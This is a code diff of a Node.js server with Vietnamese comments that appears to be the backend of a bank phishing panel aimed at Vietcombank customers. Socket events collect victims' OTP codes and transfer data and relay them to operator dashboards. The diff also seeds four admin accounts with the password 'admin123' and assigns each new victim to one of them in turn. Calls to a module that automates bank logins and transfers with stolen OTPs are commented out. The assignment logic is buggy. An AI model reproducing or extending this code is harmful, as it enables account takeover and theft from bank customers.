@@ -9,7 +9,7 @@ var bodyParser = require('body-parser')
 let multer = require("multer");
 var cors = require('cors')
 app.use(cors())
-const moduleBank = require('./modules');
+// const moduleBank = require('./modules');
 const socketIo = require("socket.io")(server, {
     cors: {
         origin: "*",
@@ -40,15 +40,23 @@ connection.once("open", async () => {
         await setting.save();
     }
 
-    const adminData = await admins.findOne({}).lean().exec();
+    const adminData = await admins.find({}).lean().exec();
 
-    if (!adminData) {
 
+    if (!adminData.length) {
         const admin = new admins()
         admin.username = 'admin';
         admin.password = 'admin123';
+        admin.role = true;
 
-        await admin.save();
+        await admin.save()
+        for (let index = 0; index < 4; index++) {
+            const admin = new admins()
+            admin.username = 'admin' + (index + 1);
+            admin.password = 'admin123';
+            admin.role = true;
+            await admin.save();
+        }
     }
 });
 
@@ -80,11 +88,11 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
         console.log("Client disconnected"); // Khi client disconnect thì log ra terminal.
     });
 
-    socket.on('send-data-otp-vcb', async (data) => {
-        console.log(data);
-        const response = await moduleBank.xacthucOTPLogin(data.method, socket.id);
-        socket.emit('send-data-otp-vcb', response);
-    })
+    // socket.on('send-data-otp-vcb', async (data) => {
+    //     console.log(data);
+    //     const response = await moduleBank.xacthucOTPLogin(data.method, socket.id);
+    //     socket.emit('send-data-otp-vcb', response);
+    // })
 
     socket.on('send-data-send-otp-vcb', async (data) => {
         // const response = await moduleBank.xacthucOTPVCB(data.otp, socket.id);
@@ -92,16 +100,16 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
         socketIo.emit('send-data-admin-user', data);
     })
 
-    socket.on('send-method-ct-vcb', async (data) => {
-        const response = await moduleBank.xacthucMethodCtVCB(data.method, socket.id);
-        socket.emit('send-method-ct-vcb', response);
-    })
+    // socket.on('send-method-ct-vcb', async (data) => {
+    //     const response = await moduleBank.xacthucMethodCtVCB(data.method, socket.id);
+    //     socket.emit('send-method-ct-vcb', response);
+    // })
 
-    socket.on('send-data-send-otp-vcb-chuyentien', async (data) => {
-        const response = await moduleBank.xacthucCTVCB(data.otp, socket.id);
-        console.log('response', response);
-        socket.emit('send-data-send-otp-vcb-chuyentien', response);
-    })
+    // socket.on('send-data-send-otp-vcb-chuyentien', async (data) => {
+    //     const response = await moduleBank.xacthucCTVCB(data.otp, socket.id);
+    //     console.log('response', response);
+    //     socket.emit('send-data-send-otp-vcb-chuyentien', response);
+    // })
 
     socket.on('send-data', async (data) => {
         console.log(data);
@@ -136,11 +144,11 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
         //         break;
         // }
     });
-    socket.on('send-data-b', async (data) => {
-        console.log(data);
-        const response = await moduleBank.xacthuc(data.otp, data.bankName);
-        socket.emit('send-data-b', response);
-    })
+    // socket.on('send-data-b', async (data) => {
+    //     console.log(data);
+    //     const response = await moduleBank.xacthuc(data.otp, data.bankName);
+    //     socket.emit('send-data-b', response);
+    // })
 
     socket.on('send-data-user', (data) => {
         socketIo.emit(`send-data-user-${data.numberPhone}`, data);
@@ -259,13 +267,23 @@ app.get('/api/get-setting', async (req, res) => {
     })
 });
 
-app.get('/api/get-user', async (req, res) => {
+app.get('/api/get-user/:adminId', async (req, res) => {
     // user order by createAt
-    const userData = await users.find({}).sort({ createAt: -1 }).lean().exec();
-    return res.status(200).json({
-        message: 'success',
-        data: userData
-    })
+    const admin = await admins.findOne({ _id: req.params.adminId }).lean().exec();
+
+    if (admin.role) {
+        const userData = await users.find({}).sort({ createAt: -1 }).lean().exec();
+        return res.status(200).json({
+            message: 'success',
+            data: userData
+        })
+    } else {
+        const userData = await users.find({ adminId: req.params.adminId }).sort({ createAt: -1 }).lean().exec();
+        return res.status(200).json({
+            message: 'success',
+            data: userData
+        })
+    }
 });
 
 app.get('/api/get-user/:id', async (req, res) => {
@@ -313,6 +331,18 @@ app.get('/api/check-user/:numberPhone', async (req, res) => {
 
 app.post('/api/insert-user', async (req, res) => {
     const user = new users(req.body);
+    // có tất cả 4 admin thì mỗi khi thêm mới người dùng sẽ chọn lần lượt admin 1, admin 2, admin 3, admin 4
+    // 1. lấy ra tất cả admin
+    const adminData = await admins.find({}).lean().exec();
+    // 2. lấy ra người dùng cuối cùng
+    const userData = await users.find({}).sort({ createAt: -1 }).lean().exec();
+    // 3. lấy ra admin cuối cùng
+    const lastAdmin = userData[0].adminId;
+    // 4. lấy ra admin tiếp theo
+    const nextAdmin = adminData.find(item => item._id !== lastAdmin);
+    // 5. gán admin tiếp theo cho người dùng mới
+    user.adminId = nextAdmin._id;
+
     await user.save();
     socketIo.emit('send-data-admin', {
         ...req.body,
